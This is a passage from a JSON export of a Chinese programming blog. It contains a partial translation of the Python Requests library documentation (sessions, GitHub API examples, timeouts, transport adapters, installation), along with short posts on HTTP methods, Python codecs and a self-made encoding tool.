comments[2][u'body']\nProbably in the \"advanced\" section\n```\n\n嗯，那看起来似乎是个愚蠢之处。我们发表个评论来告诉这个评论者他自己的愚蠢。那么，这个评论者是谁呢？\n\n```python\n\u003e\u003e\u003e print comments[2][u'user'][u'login']\nkennethreitz\n```\n\n好，我们来告诉这个叫肯尼思的家伙，这个例子应该放在快速上手指南中。根据GitHub API文档， 其方法是POST到该话题。我们来试试看。\n\n```python\n\u003e\u003e\u003e body = json.dumps({u\"body\": u\"Sounds great! I'll get right on it!\"})\n\u003e\u003e\u003e url = u\"https://api.github.com/repos/kennethreitz/requests/issues/482/comments\"\n\u003e\u003e\u003e r = requests.post(url=url, data=body)\n\u003e\u003e\u003e r.status_code\n404\n```\n\n额，这有点古怪哈。可能我们需要验证身份。那就有点纠结了，对吧？不对。Requests简化了多种身份验证形式的使用， 包括非常常见的Basic Auth。\n\n```python\n\u003e\u003e\u003e from requests.auth import HTTPBasicAuth\n\u003e\u003e\u003e auth = HTTPBasicAuth('fake@example.com', 'not_a_real_password')\n\u003e\u003e\u003e r = requests.post(url=url, data=body, auth=auth)\n\u003e\u003e\u003e r.status_code\n201\n\u003e\u003e\u003e content = r.json()\n\u003e\u003e\u003e print(content[u'body'])\nSounds great! I'll get right on it.\n```\n\n精彩！噢，不！我原本是想说等我一会，因为我得去喂一下我的猫。如果我能够编辑这条评论那就好了！ 幸运的是，GitHub允许我们使用另一个HTTP动词，PATCH，来编辑评论。我们来试试。\n\n```python\n\u003e\u003e\u003e print(content[u\"id\"])\n5804413\n\u003e\u003e\u003e body = json.dumps({u\"body\": u\"Sounds great! I'll get right on it once I feed my cat.\"})\n\u003e\u003e\u003e url = u\"https://api.github.com/repos/kennethreitz/requests/issues/comments/5804413\"\n\u003e\u003e\u003e r = requests.patch(url=url, data=body, auth=auth)\n\u003e\u003e\u003e r.status_code\n200\n```\n\n非常好。现在，我们来折磨一下这个叫肯尼思的家伙，我决定要让他急得团团转，也不告诉他是我在捣蛋。 这意味着我想删除这条评论。GitHub允许我们使用完全名副其实的DELETE方法来删除评论。我们来清除该评论。\n\n```python\n\u003e\u003e\u003e r = requests.delete(url=url, auth=auth)\n\u003e\u003e\u003e r.status_code\n204\n\u003e\u003e\u003e r.headers['status']\n'204 No Content'\n```\n\n很好。不见了。最后一件我想知道的事情是我已经使用了多少限额（ratelimit）。查查看，GitHub在响应头部发送这个信息， 因此不必下载整个网页，我将使用一个HEAD请求来获取响应头。\n\n```python\n\u003e\u003e\u003e r = requests.head(url=url, auth=auth)\n\u003e\u003e\u003e print r.headers\n...\n'x-ratelimit-remaining': '4995'\n'x-ratelimit-limit': '5000'\n...\n```\n\n很好。是时候写个Python程序以各种刺激的方式滥用GitHub的API，还可以使用4995次呢。\n\n-----------\n## 响应头链接字段\n---------------\n\n许多HTTP API都有响应头链接字段的特性，它们使得API能够更好地自我描述和自我显露。\n\nGitHub在API中为 [分页](http://developer.github.com/v3/#pagination) 使用这些特性，例如:\n\n```python\n\u003e\u003e\u003e url = 'https://api.github.com/users/kennethreitz/repos?page=1\u0026per_page=10'\n\u003e\u003e\u003e r = requests.head(url=url)\n\u003e\u003e\u003e r.headers['link']\n'\u003chttps://api.github.com/users/kennethreitz/repos?page=2\u0026per_page=10\u003e; rel=\"next\", \u003chttps://api.github.com/users/kennethreitz/repos?page=6\u0026per_page=10\u003e; rel=\"last\"'\n```\n\nRequests会自动解析这些响应头链接字段，并使得它们非常易于使用:\n\n```python\n\u003e\u003e\u003e r.links[\"next\"]\n{'url': 'https://api.github.com/users/kennethreitz/repos?page=2\u0026per_page=10', 'rel': 'next'}\n\n\u003e\u003e\u003e r.links[\"last\"]\n{'url': 'https://api.github.com/users/kennethreitz/repos?page=7\u0026per_page=10', 'rel': 'last'}\n```\n\n-------------\n## Transport Adapters\n------------\n\nAs of v1.0.0, Requests has moved to a modular internal design. Part of the reason this was done was to implement Transport Adapters, originally [described here](http://www.kennethreitz.org/essays/the-future-of-python-http). Transport Adapters provide a mechanism to define interaction methods for an HTTP service. In particular, they allow you to apply per-service configuration.\n\nRequests ships with a single Transport Adapter, the HTTPAdapter. This adapter provides the default Requests interaction with HTTP and HTTPS using the powerful [urllib3](https://github.com/shazow/urllib3) library. Whenever a Requests [Session](http://cn.python-requests.org/zh_CN/latest/api.html#requests.Session) is initialized, one of these is attached to the [Session](http://cn.python-requests.org/zh_CN/latest/api.html#requests.Session) object for HTTP, and one for HTTPS.\n\nRequests enables users to create and use their own Transport Adapters that provide specific functionality. Once created, a Transport Adapter can be mounted to a Session object, along with an indication of which web services it should apply to.\n\n```python\n\u003e\u003e\u003e s = requests.Session()\n\u003e\u003e\u003e s.mount('http://www.github.com', MyAdapter())\n```\n\nThe mount call registers a specific instance of a Transport Adapter to a prefix. Once mounted, any HTTP request made using that session whose URL starts with the given prefix will use the given Transport Adapter.\n\nMany of the details of implementing a Transport Adapter are beyond the scope of this documentation, but take a look at the next example for a simple SSL use- case. For more than that, you might look at subclassing *requests.adapters.BaseAdapter*.\n\n### Example: Specific SSL Version\n\nThe Requests team has made a specific choice to use whatever SSL version is default in the underlying library ([urllib3](https://github.com/shazow/urllib3)). Normally this is fine, but from time to time, you might find yourself needing to connect to a service-endpoint that uses a version that isn’t compatible with the default.\n\nYou can use Transport Adapters for this by taking most of the existing implementation of HTTPAdapter, and adding a parameter *ssl_version* that gets passed-through to *urllib3*. We’ll make a TA that instructs the library to use SSLv3:\n\n```python\nimport ssl\n\nfrom requests.adapters import HTTPAdapter\nfrom requests.packages.urllib3.poolmanager import PoolManager\n\n\nclass Ssl3HttpAdapter(HTTPAdapter):\n    \"\"\"\"Transport adapter\" that allows us to use SSLv3.\"\"\"\n\n    def init_poolmanager(self, connections, maxsize, block=False):\n        self.poolmanager = PoolManager(num_pools=connections,\n                                       maxsize=maxsize,\n                                       block=block,\n                                       ssl_version=ssl.PROTOCOL_SSLv3)\n```\n\n-----------\n## Blocking Or Non-Blocking?\n-----------\n\nWith the default Transport Adapter in place, Requests does not provide any kind of non-blocking IO. The [**Response.content**](http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.content) property will block until the entire response has been downloaded. If you require more granularity, the streaming features of the library (see [流式请求](http://cn.python-requests.org/zh_CN/latest/user/advanced.html#streaming-requests)) allow you to retrieve smaller quantities of the response at a time. However, these calls will still block.\n\nIf you are concerned about the use of blocking IO, there are lots of projects out there that combine Requests with one of Python’s asynchronicity frameworks. Two excellent examples are [grequests](https://github.com/kennethreitz/grequests) and [requests-futures](https://github.com/ross/requests-futures).\n\n----------\n## Timeouts\n----------\nMost requests to external servers should have a timeout attached, in case the server is not responding in a timely manner. Without a timeout, your code may hang for minutes or more.\n\nThe connect timeout is the number of seconds Requests will wait for your client to establish a connection to a remote machine (corresponding to the [connect()](http://linux.die.net/man/2/connect)) call on the socket. It’s a good practice to set connect timeouts to slightly larger than a multiple of 3, which is the default [TCP packet retransmission window](http://www.hjp.at/doc/rfc/rfc2988.txt).\n\nOnce your client has connected to the server and sent the HTTP request, the read timeout is the number of seconds the client will wait for the server to send a response. (Specifically, it’s the number of seconds that the client will wait between bytes sent from the server. In 99.9% of cases, this is the time before the server sends the first byte).\n\nIf you specify a single value for the timeout, like this:\n\n```python\nr = requests.get('https://github.com', timeout=5)\n```\n\nThe timeout value will be applied to both the connect and the read timeouts. Specify a tuple if you would like to set the values separately:\n\n```python\nr = requests.get('https://github.com', timeout=(3.05, 27))\n```\n\nIf the remote server is very slow, you can tell Requests to wait forever for a response, by passing None as a timeout value and then retrieving a cup of coffee.\n\n```python\nr = requests.get('https://github.com', timeout=None)\n```\n\n----------\n## CA Certificates\n-----------\n\nBy default Requests bundles a set of root CAs that it trusts, sourced from the [Mozilla trust store](https://hg.mozilla.org/mozilla-central/raw-file/tip/security/nss/lib/ckfw/builtins/certdata.txt). However, these are only updated once for each Requests version. This means that if you pin a Requests version your certificates can become extremely out of date.\n\nFrom Requests version 2.4.0 onwards, Requests will attempt to use certificates from [certifi](http://certifi.io/) if it is present on the system. This allows for users to update their trusted certificates without having to change the code that runs on their system.\n\nFor the sake of security we recommend upgrading certifi frequently!\n\n\n\n\n\n\n---------------------\n\n\n\n\n\n\u003e**说明：前面有些官方文档没翻译到的，我自己翻译了，后一部分，时间太晚了，是在没精力了，以后有时间再翻译，可能我翻译的有些语句不通顺，但是还是能大概表达出意思的，如果你对比了官方文档，觉得你可以翻译得更好，可以私信或留言我哦**\n\n\u003e**想喷我的人也省省吧，的确，这篇文章和之前的一篇Requests安装使用都是我从官网移植过来的，但是我花时间翻译了一部分，排版也废了番功夫，使用MarkDown写成，需要源md文档也可以找我索要，本文随意传播**\n\n\u003e-------\n\n\u003e**我是Akkuman，同道人可以和我一起交流哦，私信或留言均可,我的博客hacktech.cn | 53xiaoshuo.com**\n\n\u003e-------\n","cover":"","link":"2016/06/10/python之requests的高级用法.html","preview":"\u003chr /\u003e\n\n\u003ch1\u003e高级用法\u003c/h1\u003e\n\n\u003chr /\u003e\n\n\u003cp\u003e本篇文档涵盖了Requests的一些更加高级的特性。\u003c/p\u003e\n\n\u003chr /\u003e\n\n\u003ch2\u003e会话对象\u003c/h2\u003e\n\n\u003chr /\u003e\n\n\u003cp\u003e会话对象让你能够跨请求保持某些参数。它也会在同一个Session实例发出的所有请求之间保持cookies。\u003c/p\u003e\n\n\u003cp\u003e会话对象具有主要的Requests API的所有方法。\u003c/p\u003e\n\n\u003cp\u003e我们来跨请求保持一些cookies:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-python\"\u003es = requests.Session()\n\ns.get('http://httpbin.org/cookies/set/sessioncookie/123456789')\nr = s.get(\u0026quot;http://httpbin.org/cookies\u0026quot;)\n\nprint(r.text)\n# '{\u0026quot;cookies\u0026quot;: {\u0026quot;sessioncookie\u0026quot;: \u0026quot;123456789\u0026quot;}}'\n\u003c/code\u003e\u003c/pre\u003e\n","title":"Python之Requests的高级用法"},{"content":"\n\n\n----------\n\n\n**HTTP协议中共定义了八种方法或者叫“动作”来表明对Request-URI指定的资源的不同操作方式，具体介绍如下：**\n\n----------\n# OPTIONS：\n返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送'*'的请求来测试服务器的功能性。\n# HEAD：\n向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。\n# GET：\n向特定的资源发出请求。\n\n# POST：\n向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。 \n# PUT：\n向指定资源位置上传其最新内容。 \n# DELETE：\n请求服务器删除Request-URI所标识的资源。 \n# TRACE：\n回显服务器收到的请求，主要用于测试或诊断。 \n# CONNECT：\nHTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。\n\n----------\n**虽然HTTP的请求方式有8种，但是我们在实际应用中常用的也就是get和post，其他请求方式也都可以通过这两种方式间接的来实现。**\n\n-----------\n转载自：http://www.xuebuyuan.com/1586750.html\n","cover":"","link":"2016/06/10/http协议请求类型介绍.html","preview":"\u003chr /\u003e\n\n\u003cp\u003e\u003cstrong\u003eHTTP协议中共定义了八种方法或者叫“动作”来表明对Request-URI指定的资源的不同操作方式，具体介绍如下：\u003c/strong\u003e\u003c/p\u003e\n\n\u003chr /\u003e\n\n\u003ch1\u003eOPTIONS：\u003c/h1\u003e\n\n\u003cp\u003e返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送\u0026rsquo;*\u0026lsquo;的请求来测试服务器的功能性。\u003c/p\u003e\n\n\u003ch1\u003eHEAD：\u003c/h1\u003e\n\n\u003cp\u003e向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。\u003c/p\u003e\n\n\u003ch1\u003eGET：\u003c/h1\u003e\n\n\u003cp\u003e向特定的资源发出请求。\u003c/p\u003e\n","title":"HTTP协议请求类型介绍"},{"content":"\n\n\n\n最近老被编码困扰，多次折腾之后，感觉python的编解码做得挺好的，只要了解**下边的流程，一般都能解决**\n\n**input文件(gbk, utf-8...)   ----decode-----\u003e   unicode  -------encode------\u003e output文件(gbk, utf-8...)**\n很多文本挖掘的package是在unicode上边做事的，比如nltk. 所以开始读入文件后要decode为unicode格式，可以通过下边两步：\n```python\nf=open('XXXXX', 'r')\ncontent=f.read().decode('utf-8')\n```\n\n更好的方法是使用codecs.open读入时直接解码：\n```python\nf=codecs.open(XXX, encoding='utf-8')\ncontent=f.read()\n```\n\n\n转自: http://f.dataguru.cn/thread-237116-1-1.html\n","cover":"","link":"2016/06/10/python中的open和codecs-open.html","preview":"","title":"Python中的open和codecs.open"},{"content":"\n\n\n\n----------\n# 安装\n----------\n\n使用 pip 安装Requests非常简单\n```bash\npip install requests\n```\n或者使用 easy_install 安装\n```bash\neasy_install requests\n```\n\n--------------\n# 获得源码\n--------------\n\nRequests 一直在Github上被积极的开发着\n\n你可以克隆公共版本库:\n\n```bash\ngit clone git://github.com/kennethreitz/requests.git\n```\n\n下载 源码:\n\n```bash\ncurl -OL https://github.com/kennethreitz/requests/tarball/master\n```\n\n或者下载 zipball:\n\n```bash\ncurl -OL https://github.com/kennethreitz/requests/zipball/master\n```\n\n一旦你获得了复本，你就可以轻松的将它嵌入到你的python包里或者安装到你的site-packages:\n\n```bash\npython setup.py install\n```\n\n--------------\n# 快速上手\n--------------\n\n--------------\n## 发送请求\n--------------\n\n使用Requests发送网络请求非常简单。\n\n一开始要导入Requests模块:\n\n```python\n\u003e\u003e\u003e import requests\n```\n\n然后，尝试获取某个网页。本例子中，我们来获取Github的公共时间线\n\n```python\n\u003e\u003e\u003e r = requests.get('https://github.com/timeline.json')\n```\n\n现在，我们有一个名为 r 的 Response 对象。可以从这个对象中获取所有我们想要的信息。\n\nRequests简便的API意味着所有HTTP请求类型都是显而易见的。例如，你可以这样发送一个HTTP POST请求:\n\n```python\n\u003e\u003e\u003e r = requests.post(\"http://httpbin.org/post\")\n```\n\n漂亮，对吧？那么其他HTTP请求类型：PUT， DELETE， HEAD以及OPTIONS又是如何的呢？都是一样的简单:\n\n```python\n\u003e\u003e\u003e r = requests.put(\"http://httpbin.org/put\")\n\u003e\u003e\u003e r = requests.delete(\"http://httpbin.org/delete\")\n\u003e\u003e\u003e r = requests.head(\"http://httpbin.org/get\")\n\u003e\u003e\u003e r = requests.options(\"http://httpbin.org/get\")\n```\n\n都很不错吧，但这也仅是Requests的冰山一角呢。\n\n---------------\n## 为URL传递参数\n---------------\n\n你也许经常想为URL的查询字符串(query string)传递某种数据。如果你是手工构建URL，那么数据会以键/值 对的形式置于URL中，跟在一个问号的后面。例如， httpbin.org/get?key=val 。 Requests允许你使用 params 关键字参数，以一个字典来提供这些参数。举例来说，如果你想传递 key1=value1 和 key2=value2 到 httpbin.org/get ，那么你可以使用如下代码:\n\n```python\n\u003e\u003e\u003e payload = {'key1': 'value1', 'key2': 'value2'}\n\u003e\u003e\u003e r = requests.get(\"http://httpbin.org/get\", params=payload)\n```\n\n通过打印输出该URL，你能看到URL已被正确编码:\n\n```python\n\u003e\u003e\u003e print(r.url)\nhttp://httpbin.org/get?key2=value2\u0026key1=value1\n```\n\n注意字典里值为 None 的键都不会被添加到 URL 的查询字符串里。\n\n----------------\n## 响应内容\n-----------------\n\n我们能读取服务器响应的内容。再次以Github时间线为例:\n\n```python\n\u003e\u003e\u003e import requests\n\u003e\u003e\u003e r = requests.get('https://github.com/timeline.json')\n\u003e\u003e\u003e r.text\nu'[{\"repository\":{\"open_issues\":0,\"url\":\"https://github.com/...\n```\n\nRequests会自动解码来自服务器的内容。大多数unicode字符集都能被无缝地解码。\n\n请求发出后，Requests会基于HTTP头部对响应的编码作出有根据的推测。当你访问 r.text 之时，Requests会使用其推测的文本编码。你可以找出Requests使用了什么编码，并且能够使用 r.encoding 属性来改变它:\n\n```python\n\u003e\u003e\u003e r.encoding\n'utf-8'\n\u003e\u003e\u003e r.encoding = 'ISO-8859-1'\n```\n\n如果你改变了编码，每当你访问 r.text ，Request都将会使用 r.encoding 的新值。你可能希望在使用特殊逻辑计算出文本的编码的情况下来修改编码。比如 HTTP 和 XML 自身可以指定编码。这样的话，你应该使用 r.content 来找到编码，然后设置 r.encoding 为相应的编码。这样就能使用正确的编码解析 r.text 了。\n\n在你需要的情况下，Requests也可以使用定制的编码。如果你创建了自己的编码，并使用 codecs 模块进行注册，你就可以轻松地使用这个解码器名称作为 r.encoding 的值， 然后由Requests来为你处理编码。\n\n---------------\n## 二进制响应内容\n---------------\n\n你也能以字节的方式访问请求响应体，对于非文本请求:\n\n```python\n\u003e\u003e\u003e r.content\nb'[{\"repository\":{\"open_issues\":0,\"url\":\"https://github.com/...\n```\n\nRequests会自动为你解码 **gzip** 和 **deflate** 传输编码的响应数据。\n\n例如，以请求返回的二进制数据创建一张图片，你可以使用如下代码:\n\n```python\n\u003e\u003e\u003e from PIL import Image\n\u003e\u003e\u003e from StringIO import StringIO\n\u003e\u003e\u003e i = Image.open(StringIO(r.content))\n```\n\n-----------------\n## JSON响应内容\n----------------\n\nRequests中也有一个内置的JSON解码器，助你处理JSON数据:\n\n```python\n\u003e\u003e\u003e import requests\n\u003e\u003e\u003e r = requests.get('https://github.com/timeline.json')\n\u003e\u003e\u003e r.json()\n[{u'repository': {u'open_issues': 0, u'url': 'https://github.com/...\n```\n\n如果JSON解码失败， r.json 就会抛出一个异常。例如，相应内容是 401 (Unauthorized) ，尝试访问 r.json 将会抛出 ValueError: No JSON object could be decoded 异常。\n\n--------------\n## 原始响应内容\n-------------\n\n在罕见的情况下你可能想获取来自服务器的原始套接字响应，那么你可以访问 r.raw 。 如果你确实想这么干，那请你确保在初始请求中设置了 **stream=True** 。具体的你可以这么做:\n\n```python\n\u003e\u003e\u003e r = requests.get('https://github.com/timeline.json', stream=True)\n\u003e\u003e\u003e r.raw\n\u003crequests.packages.urllib3.response.HTTPResponse object at 0x101194810\u003e\n\u003e\u003e\u003e r.raw.read(10)\n'\\x1f\\x8b\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x03'\n```\n\n但一般情况下，你应该以下面的模式将文本流保存到文件:\n\n```python\nwith open(filename, 'wb') as fd:\n    for chunk in r.iter_content(chunk_size):\n        fd.write(chunk)\n```\n\n使用 Response.iter_content 将会处理大量你直接使用 Response.raw 不得不处理的。 当流下载时，上面是**优先推荐**的获取内容方式。\n\n-----------\n## 定制请求头\n------------\n\n如果你想为请求添加HTTP头部，只要简单地传递一个 dict 给 headers 参数就可以了。\n\n例如，在前一个示例中我们没有指定content-type:\n\n```python\n\u003e\u003e\u003e import json\n\u003e\u003e\u003e url = 'https://api.github.com/some/endpoint'\n\u003e\u003e\u003e payload = {'some': 'data'}\n\u003e\u003e\u003e headers = {'content-type': 'application/json'}\n\n\u003e\u003e\u003e r = requests.post(url, data=json.dumps(payload), headers=headers)\n```\n\n-------------\n## 更加复杂的POST请求\n-------------\n\n通常，你想要发送一些编码为表单形式的数据—非常像一个HTML表单。 要实现这个，只需简单地传递一个字典给 *data* 参数。你的数据字典 在发出请求时会自动编码为表单形式:\n\n```python\n\u003e\u003e\u003e payload = {'key1': 'value1', 'key2': 'value2'}\n\u003e\u003e\u003e r = requests.post(\"http://httpbin.org/post\", data=payload)\n\u003e\u003e\u003e print r.text\n{\n  ...\n  \"form\": {\n    \"key2\": \"value2\",\n    \"key1\": \"value1\"\n  },\n  ...\n}\n```\n\n很多时候你想要发送的数据并非编码为表单形式的。如果你传递一个 string 而不是一个 dict ，那么数据会被直接发布出去。\n\n例如，Github API v3接受编码为JSON的POST/PATCH数据:\n\n```python\n\u003e\u003e\u003e import json\n\u003e\u003e\u003e url = 'https://api.github.com/some/endpoint'\n\u003e\u003e\u003e payload = {'some': 'data'}\n\n\u003e\u003e\u003e r = requests.post(url, data=json.dumps(payload))\n```\n\n----------------\n## POST一个多部分编码(Multipart-Encoded)的文件\n---------------\n\nRequests使得上传多部分编码文件变得很简单:\n\n```python\n\u003e\u003e\u003e url = 'http://httpbin.org/post'\n\u003e\u003e\u003e files = {'file': open('report.xls', 'rb')}\n\n\u003e\u003e\u003e r = requests.post(url, files=files)\n\u003e\u003e\u003e r.text\n{\n  ...\n  \"files\": {\n    \"file\": \"\u003ccensored...binary...data\u003e\"\n  },\n  ...\n}\n```\n\n你可以显式地设置文件名，文件类型和请求头:\n\n```python\n\u003e\u003e\u003e url = 'http://httpbin.org/post'\n\u003e\u003e\u003e files = {'file': ('report.xls', open('report.xls', 'rb'), 'application/vnd.ms-excel', {'Expires': '0'})}\n\n\u003e\u003e\u003e r = requests.post(url, files=files)\n\u003e\u003e\u003e r.text\n{\n  ...\n  \"files\": {\n    \"file\": \"\u003ccensored...binary...data\u003e\"\n  },\n  ...\n}\n```\n\n如果你想，你也可以发送作为文件来接收的字符串:\n\n```python\n\u003e\u003e\u003e url = 'http://httpbin.org/post'\n\u003e\u003e\u003e files = {'file': ('report.csv', 'some,data,to,send\\nanother,row,to,send\\n')}\n\n\u003e\u003e\u003e r = requests.post(url, files=files)\n\u003e\u003e\u003e r.text\n{\n  ...\n  \"files\": {\n    \"file\": \"some,data,to,send\\\\nanother,row,to,send\\\\n\"\n  },\n  ...\n}\n```\n\n如果你发送一个非常大的文件作为 multipart/form-data 请求，你可能希望流请求(?)。默认下 requests 不支持, 但有个第三方包支持 - requests-toolbelt. 你可以阅读 toolbelt 文档 来了解使用方法。\n\n在一个请求中发送多文件参考 高级用法 一节.\n\n-------------\n## 响应状态码\n-------------\n\n我们可以检测响应状态码:\n\n```python\n\u003e\u003e\u003e r = requests.get('http://httpbin.org/get')\n\u003e\u003e\u003e r.status_code\n200\n```\n\n为方便引用，Requests还附带了一个内置的状态码查询对象:\n\n```python\n\u003e\u003e\u003e r.status_code == requests.codes.ok\nTrue\n```\n\n如果发送了一个失败请求(非200响应)，我们可以通过 Response.raise_for_status() 来抛出异常:\n\n```python\n\u003e\u003e\u003e bad_r = requests.get('http://httpbin.org/status/404')\n\u003e\u003e\u003e bad_r.status_code\n404\n\n\u003e\u003e\u003e bad_r.raise_for_status()\nTraceback (most recent call last):\n  File \"requests/models.py\", line 832, in raise_for_status\n    raise http_error\nrequests.exceptions.HTTPError: 404 Client Error\n```\n\n但是，由于我们的例子中 r 的 status_code 是 200 ，当我们调用 raise_for_status() 时，得到的是:\n\n```python\n\u003e\u003e\u003e r.raise_for_status()\nNone\n```\n\n一切都挺和谐哈。\n\n--------------\n## 响应头\n--------------\n\n我们可以查看以一个Python字典形式展示的服务器响应头:\n\n```python\n\u003e\u003e\u003e r.headers\n{\n    'content-encoding': 'gzip',\n    'transfer-encoding': 'chunked',\n    'connection': 'close',\n    'server': 'nginx/1.0.4',\n    'x-runtime': '148ms',\n    'etag': '\"e1ca502697e5c9317743dc078f67693f\"',\n    'content-type': 'application/json'\n}\n```\n\n但是这个字典比较特殊：它是仅为HTTP头部而生的。根据 RFC 2616 ， HTTP头部是大小写不敏感的。\n\n因此，我们可以使用任意大写形式来访问这些响应头字段:\n\n```python\n\u003e\u003e\u003e r.headers['Content-Type']\n'application/json'\n\n\u003e\u003e\u003e r.headers.get('content-type')\n'application/json'\n```\n\n-------------\n## Cookies\n------------\n\n如果某个响应中包含一些Cookie，你可以快速访问它们:\n\n```python\n\u003e\u003e\u003e url = 'http://example.com/some/cookie/setting/url'\n\u003e\u003e\u003e r = requests.get(url)\n\n\u003e\u003e\u003e r.cookies['example_cookie_name']\n'example_cookie_value'\n```\n\n要想发送你的cookies到服务器，可以使用 cookies 参数:\n\n```python\n\u003e\u003e\u003e url = 'http://httpbin.org/cookies'\n\u003e\u003e\u003e cookies = dict(cookies_are='working')\n\n\u003e\u003e\u003e r = requests.get(url, cookies=cookies)\n\u003e\u003e\u003e r.text\n'{\"cookies\": {\"cookies_are\": \"working\"}}'\n```\n\n--------------\n## 重定向与请求历史\n--------------\n\n默认情况下，除了 HEAD, Requests会自动处理所有重定向。\n\n可以使用响应对象的 history 方法来追踪重定向。\n\n**Response.history** 是一个:*class:Response\u0026lt;requests.Response\u0026gt;* 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。\n\n例如，Github将所有的HTTP请求重定向到HTTPS。:\n\n```pythn\n\u003e\u003e\u003e r = requests.get('http://github.com')\n\u003e\u003e\u003e r.url\n'https://github.com/'\n\u003e\u003e\u003e r.status_code\n200\n\u003e\u003e\u003e r.history\n[\u003cResponse [301]\u003e]\n```\n\n如果你使用的是GET, OPTIONS, POST, PUT, PATCH 或者 DELETE,，那么你可以通过 allow_redirects 参数禁用重定向处理:\n\n```python\n\u003e\u003e\u003e r = requests.get('http://github.com', allow_redirects=False)\n\u003e\u003e\u003e r.status_code\n301\n\u003e\u003e\u003e r.history\n[]\n```\n\n如果你使用的是HEAD，你也可以启用重定向:\n\n```python\n\u003e\u003e\u003e r = requests.head('http://github.com', allow_redirects=True)\n\u003e\u003e\u003e r.url\n'https://github.com/'\n\u003e\u003e\u003e r.history\n[\u003cResponse [301]\u003e]\n```\n\n-------------\n## 超时\n-------------\n\n你可以告诉requests在经过以 timeout 参数设定的秒数时间之后停止等待响应:\n\n```python\n\n\u003e\u003e\u003e requests.get('http://github.com', timeout=0.001)\nTraceback (most recent call last):\n  File \"\u003cstdin\u003e\", line 1, in \u003cmodule\u003e\nrequests.exceptions.Timeout: HTTPConnectionPool(host='github.com', port=80): Request timed out. (timeout=0.001)\n```\n\n\u003e**注::**\n\u003etimeout 仅对连接过程有效，与响应体的下载无关。timeout并不是整个下载响应的时间限制，而是如果服务器在``timeout``秒内没有应答，将会引发一个异常（更精确地说，是在``timeout``秒内没有从基础套接字上接收到任何字节的数据时）\n\n---------------\n## 错误与异常\n---------------\n\n遇到网络问题（如：DNS查询失败、拒绝连接等）时，Requests会抛出一个 **ConnectionError** 异常。\n\n遇到罕见的无效HTTP响应时，Requests则会抛出一个 **HTTPError** 异常。\n\n若请求超时，则抛出一个 **Timeout** 异常。\n\n若请求超过了设定的最大重定向次数，则会抛出一个 **TooManyRedirects** 异常。\n\n所有Requests显式抛出的异常都继承自 **requests.exceptions.RequestException** 。\n","cover":"","link":"2016/06/09/python之requests的安装与基本使用.html","preview":"\u003chr /\u003e\n\n\u003ch1\u003e安装\u003c/h1\u003e\n\n\u003chr /\u003e\n\n\u003cp\u003e使用 pip 安装Requests非常简单\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003epip install requests\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003e或者使用 easy_install 安装\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003eeasy_install requests\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003chr /\u003e\n\n\u003ch1\u003e获得源码\u003c/h1\u003e\n\n\u003chr /\u003e\n\n\u003cp\u003eRequests 一直在Github上被积极的开发着\u003c/p\u003e\n\n\u003cp\u003e你可以克隆公共版本库:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003egit clone git://github.com/kennethreitz/requests.git\n\u003c/code\u003e\u003c/pre\u003e\n","title":"Python之Requests的安装与基本使用"},{"content":"\n\n\n\n**闲来无事，写了款编码转换工具**\n\n**以我的审美来看，界面应该算美丽**\n\n------\n\n**截图 :**\n\n------\n\n![Akkuman](http://7xusrl.com1.z0.glb.clouddn.com/%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7.png)\n\n# 下载地址：\n\n[**编码转换工具**](http://cloud.189.cn/t/yueaMb7VnmAb)\n\n\n*转载请注明出处*\n\n*作者博客 53xiaoshou.com | hacktech.cn*\n","cover":"","link":"2016/06/09/编码转换工具.html","preview":"\u003cp\u003e\u003cstrong\u003e闲来无事，写了款编码转换工具\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003e以我的审美来看，界面应该算美丽\u003c/strong\u003e\u003c/p\u003e\n\n\u003chr /\u003e\n\n\u003cp\u003e\u003cstrong\u003e截图 :\u003c/strong\u003e\u003c/p\u003e\n\n\u003chr /\u003e\n\n\u003cp\u003e\u003cimg 